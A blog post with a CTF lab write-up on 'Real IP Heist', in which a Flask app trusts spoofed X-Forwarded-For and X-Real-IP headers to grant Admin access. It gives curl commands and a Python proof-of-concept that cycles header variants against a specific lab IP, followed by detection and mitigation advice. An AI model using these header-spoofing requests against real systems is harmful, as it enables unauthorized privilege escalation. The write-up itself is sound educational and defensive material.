---
layout: post
title: "Real ip heist write up"
author: Alex Maina Weru
date: 2025-11-03
categories: [Lab and CTF challenges]
tags: [ctf, htb, tryhackme, labs]
image:
  path: assets/web.webp
  alt: Blog-as-Code
---

# Real IP Heist — Writeup

## Summary

The web application trusted client-supplied proxy headers (`X-Forwarded-For`, `X-Real-IP`) to determine a client's IP and used that IP as an authorization signal (to grant Admin privileges). By spoofing these headers (e.g., setting `X-Forwarded-For: 127.0.0.1`) and submitting `access_level=Admin`, an attacker can escalate privileges and access the admin panel to retrieve the flag.

---

## Evidence from the app

- The page source included client-side JavaScript that sends a `POST` to `/` and sets `X-Forwarded-For: 8.8.8.8`. This strongly suggests the server looks for `X-Forwarded-For` when deciding content.
- Server header: `Werkzeug/3.1.3 Python/3.11.10` — typical Flask/Werkzeug stack where middleware and `request` attributes often expose proxied client IPs.
- The login form accepted `access_level` from the client side which the server used in combination with the client IP to decide privileges.

---

## Root cause (vulnerability)

The application **trusted client-supplied proxy headers** for authorization. HTTP headers such as `X-Forwarded-For` and `X-Real-IP` can be set by any client. If the app uses these headers directly to decide whether the request originates from an internal/trusted host (for example, `127.0.0.1` or private ranges), an attacker can spoof those headers to impersonate an internal client and gain elevated access.

This is a classic example of *trusting untrusted input* (headers) for security decisions.

---

## Step-by-step exploit

**1. Explore baseline page**

```bash
curl -i http://54.72.82.22:8085/
```

You will see a login form and JS that posts to `/` with `X-Forwarded-For` set client-side.

**2. Spoof `X-Forwarded-For` and request Admin access**

Send a POST to `/` with `access_level=Admin` while spoofing `X-Forwarded-For` as loopback (127.0.0.1):

```bash
curl -i -X POST http://54.72.82.22:8085/ \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d "username=attacker&access_level=Admin"
```

**Expected response** (example):

```
<h2>Hello, admin</h2>
<p>Access level: Admin</p>
<p><a href="/admin">Go to admin panel</a></p>
```

**3. Visit admin panel while spoofing the same header**

```bash
curl -i -H "X-Forwarded-For: 127.0.0.1" http://54.72.82.22:8085/admin
```

If successful, the admin page should reveal the flag or additional admin-only functionality.

**Header variations that may be required**

- `X-Real-IP: 127.0.0.1`
- `X-Forwarded-For: 1.2.3.4, 127.0.0.1` (comma lists exploit different parsing logic)
- Private-range addresses: `10.0.0.1`, `192.168.0.1`
- IPv6 loopback: `::1`

Different servers/frameworks/proxies may parse these values differently (first vs last IP in a list); try combinations if one fails.

---

## PoC automation (Python)

```python
import requests

url = "http://54.72.82.22:8085/"
headers_list = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-For": "1.2.3.4, 127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
]

for h in headers_list:
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    headers.update(h)
    r = requests.post(url, headers=headers, data={"username":"attacker","access_level":"Admin"})
    print(h, r.status_code, len(r.text))
    print(r.text[:400])
    print('---')
```

---

## Why the header tricks work

- Reverse proxies often append the client IP to `X-Forwarded-For` as a comma-separated list. Some applications pick the first item, others take the last. By supplying lists with `127.0.0.1` at different positions, you can target either behavior.
- `X-Real-IP` is a different de-facto standard header used by some proxies/frameworks.
- Apps that do not validate or restrict which proxies they trust may accept these headers directly.

---

## Detection (for defenders)

- Search web server logs for incoming requests that include `X-Forwarded-For` or `X-Real-IP` headers from client IP ranges that should not provide them.
- Alert when `X-Forwarded-For` contains loopback/internal IPs but `REMOTE_ADDR` is external.
- Instrument the app to log both `REMOTE_ADDR` and any proxy headers for critical operations, and check for mismatches.

---

## Mitigations & fixes

1. **Never trust client-supplied proxy headers** unless they are set by a trusted reverse proxy that you control. Strip or overwrite incoming `X-Forwarded-For` at the proxy boundary.

2. **Configure trusted proxy middleware properly.** For Flask/Werkzeug, use `ProxyFix` only when you are certain of how many proxies are between the client and the app:

```python
from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1)
```

3. **Require proper authentication** for admin functionality. Do not rely on IP-based authorization alone.

4. **Network-level controls.** Restrict admin endpoints to internal networks via firewall rules, VPN, or mutually-authenticated TLS.

5. **Validate header contents.** If you must use them, validate that the header originated from a trusted proxy and that values are plausible.

---

## Short remediation checklist

- Ensure reverse proxy **strips** incoming `X-Forwarded-For` from clients and **sets** it itself.
- Configure `ProxyFix` or equivalent middleware only for known and trusted proxies.
- Protect admin endpoints with authentication and network ACLs.
- Add logging/alerts for `REMOTE_ADDR` vs proxy header mismatches.

---

## Lessons learned

- Client-controlled headers are untrusted input — never use them for access control.
- Simple `curl` header spoofing is an effective first step during pentests.
- UI/JS that sets proxy headers client-side is a clear red flag; investigate closely.

---

## Extras (optional)

If you want, I can:
- Convert this markdown into a standalone HTML file.
- Generate a small vulnerable Flask demo + a fixed version for teaching.
- Create a short slide deck summarizing the vulnerability and fix.


*End of writeup.*
